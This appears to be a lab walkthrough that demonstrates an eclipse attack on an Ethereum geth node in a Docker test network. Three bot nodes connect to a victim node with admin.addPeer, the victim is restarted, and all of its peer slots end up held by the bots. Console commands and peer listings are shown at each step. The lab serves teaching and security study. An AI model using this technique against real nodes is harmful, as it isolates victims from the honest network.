In the following, I will demostrate how to eclipse an Ethereum node.

After the preparation, there are seven nodes (1 bootnode, 3 honest nodes, and 3 bot nodes) in your computer.

1. We fist launch the blockchain network by running the bootnode, and compute its enode url.
   The format of enode url is **node_ID@ip_addr:port**
   ```sh
   sudo docker attach boot
   ip addr
   ./start_console.sh
   admin.nodeInfo
   ```
   After `sudo docker attach boot`, we enter into the running bootnode container.
   
   After `ip addr`, we can get the ip addr of bootnode, e.g., **172.17.0.2**.
   
   After `./start_console.sh`, we launch the geth client in bootnode.
   
   After `admin.nodeInfo`, we get the node id and port of the bootnode, e.g., **933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762** and **30303**.

   Hence, the enode url of the bootnode is **enode://933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762@172.17.0.2:30303**
   
   Finally, you can exit the bootnode with keeping it alive.

2. We then launch the 3 honest nodes with connecting to the bootnode. (I have set the maxpeers parameter as 3 for honest nodes in the `./start_console.sh`)
   ```sh
   sudo docker attach node1
   ip addr
   ./start_console.sh enode://933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762@172.17.0.2:30303
   admin.nodeInfo
   ```
   After `sudo docker attach node1`, we enter into the running node1 container.
   
   After `./start_console.sh enode://933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762@172.17.0.2:30303`, we launch the geth 
   client in node1 with connecting to the bootnode.

   Besides, we pick the node1 as the victim node and compute its enode url as **enode://394416013de714e5cc228be5453edf5ceafcc426038e56ca6ba2079807a24967a0c8453c805074cfceaeeb01b704603a4fab08417cff94607601959925297621@172.17.0.3:30303**

   You can exit node1 with keeping it alive.

   Then, repeat the same steps to launch the geth clients in node2 and node3.

   Besides, according to the contents outputed in terminal, the ip addresses of node1, node2, and node3 are "172.17.0.3, 172.17.0.4, and 172.17.0.5", respectively.

   In node3, after launching the geth client, you can check whether all three nodes are connected to the network by checking the peers of node3.
   ```sh
   admin.peers
   ```
   Then the terminal will output contents like the following, which means node3 has three peers according to the ip addresses, i.e., the bootnode, node1, and node2.
   ```sh
   [{
        caps: ["eth/63"],
        id: "394416013de714e5cc228be5453edf5ceafcc426038e56ca6ba2079807a24967a0c8453c805074cfceaeeb01b704603a4fab08417cff94607601959925297621",
        name: "Geth/v1.6.6-stable/linux-amd64/go1.7.3",
        network: {
        localAddress: "172.17.0.5:41626",
        remoteAddress: "172.17.0.3:30303"
        },
        protocols: {
        eth: {
            difficulty: 256,
            head: "0xf884df310b36abca7117a60ac2b28ca17821a0767a20dcbc4e87f5934ac72d72",
            version: 63
        }
        }
    }, {
        caps: ["eth/63"],
        id: "67a8b01aeaf5c8678107fe5135828f00d5a350955ffec6b38f1251d3294bfb628e92563dafe94e25b07ddbf52318d96634a56a9b2bc31aeb21a4bad3b5dca660",
        name: "Geth/v1.6.6-stable/linux-amd64/go1.7.3",
        network: {
        localAddress: "172.17.0.5:30303",
        remoteAddress: "172.17.0.4:49882"
        },
        protocols: {
        eth: {
            difficulty: 256,
            head: "0xf884df310b36abca7117a60ac2b28ca17821a0767a20dcbc4e87f5934ac72d72",
            version: 63
        }
        }
    }, {
        caps: ["eth/63"],
        id: "933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762",
        name: "Geth/v1.6.6-stable/linux-amd64/go1.7.3",
        network: {
        localAddress: "172.17.0.5:52278",
        remoteAddress: "172.17.0.2:30303"
        },
        protocols: {
        eth: {
            difficulty: 256,
            head: "0xf884df310b36abca7117a60ac2b28ca17821a0767a20dcbc4e87f5934ac72d72",
            version: 63
        }
        }
    }]
   ```

3. We next launch geth clients in the three bot nodes.
   ```sh
   sudo docker attach bot1
   ip addr
   ./start_console.sh enode://933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762@172.17.0.2:30303
   admin.nodeInfo
   admin.addPeer("enode://394416013de714e5cc228be5453edf5ceafcc426038e56ca6ba2079807a24967a0c8453c805074cfceaeeb01b704603a4fab08417cff94607601959925297621@172.17.0.3:30303")
   ```

   After `admin.addPeer("enode://394416013de714e5cc228be5453edf5ceafcc426038e56ca6ba2079807a24967a0c8453c805074cfceaeeb01b704603a4fab08417cff94607601959925297621@172.17.0.3:30303")`, we add the node1 to be bot1's peer.

   You can check the peers of bot1, it shows that bot1 doesnot have the peer of node1. This is because the peers of node1 reach to the limit (3).

   You can exit bot1 with keeping it alive.

   Then, repeat the same steps to launch the geth clients in bot2 and bot3.

   Besides, according to the contents outputed in terminal, the ip addresses of bot1, bot2, and bot3 are "172.17.0.6, 172.17.0.7, and 172.17.0.8", respectively.

4. We get back to node1, and reboot it.
   ```sh
   sudo docker attach node1
   admin.peers
   ```
   We can first check the peers of node1. It shows that node1 has three peers, i.e., bootnode, node2, and node3.

   Then we reboot geth client in node1.
   ```sh
   exit
   ./start_console.sh enode://933bb54c429b74f94a49a49af6f63ab91891ff6dcce386f49134fa80370c108aab391dcdbe4dd592318ad8b8650513318a06947e2ac19f43a0abd1c3e944e762@172.17.0.2:30303
   ```

   Now we check the peers of node1 by `admin.peers`, and the terminal will output contenst like following information:
   ```
   [{
        caps: ["eth/63"],
        id: "228faed846b2307db753d79e037c1dd36d6fdbfe30065934961066bcfe4455e50a46d88db2d756085132de0b920a9f2cc3c029799b3537ada78a6c85635d9ddd",
        name: "Geth/v1.6.6-stable/linux-amd64/go1.7.3",
        network: {
        localAddress: "172.17.0.3:30303",
        remoteAddress: "172.17.0.7:45296"
        },
        protocols: {
        eth: {
            difficulty: 256,
            head: "0xf884df310b36abca7117a60ac2b28ca17821a0767a20dcbc4e87f5934ac72d72",
            version: 63
        }
        }
    }, {
        caps: ["eth/63"],
        id: "8d20fadd8ea776445e7b87b692d283656b776bba9b43c587b488600ff99237ec0682010efe1de06cde200fed7e0d56b8005d833bae2c63da180bb5d669bca5fa",
        name: "Geth/v1.6.6-stable/linux-amd64/go1.7.3",
        network: {
        localAddress: "172.17.0.3:30303",
        remoteAddress: "172.17.0.6:36212"
        },
        protocols: {
        eth: {
            difficulty: 256,
            head: "0xf884df310b36abca7117a60ac2b28ca17821a0767a20dcbc4e87f5934ac72d72",
            version: 63
        }
        }
    }, {
        caps: ["eth/63"],
        id: "bcb62d50c5e5c441602ed3fe93915e5a67c8392188d017126728d9b23ecc1245633bde98c7a633949e1a8f97be0bced845e157e0e17049602386c20e0aafb78a",
        name: "Geth/v1.6.6-stable/linux-amd64/go1.7.3",
        network: {
        localAddress: "172.17.0.3:53296",
        remoteAddress: "172.17.0.8:30303"
        },
        protocols: {
        eth: {
            difficulty: 256,
            head: "0xf884df310b36abca7117a60ac2b28ca17821a0767a20dcbc4e87f5934ac72d72",
            version: 63
        }
        }
    }]
    ```
   
    We can find that the peers of node1 are the bot1, bot2, and bot3. It shows that the peers of node1 are eclipsed by the bot nodes.


## Notes
While connecting to the Ethereum mainnet, we do not need to set the bootnode, and the geth client will automatically search peers. In the lab1, we demostrate eclipse attack in a controlled environment by using our bootnode.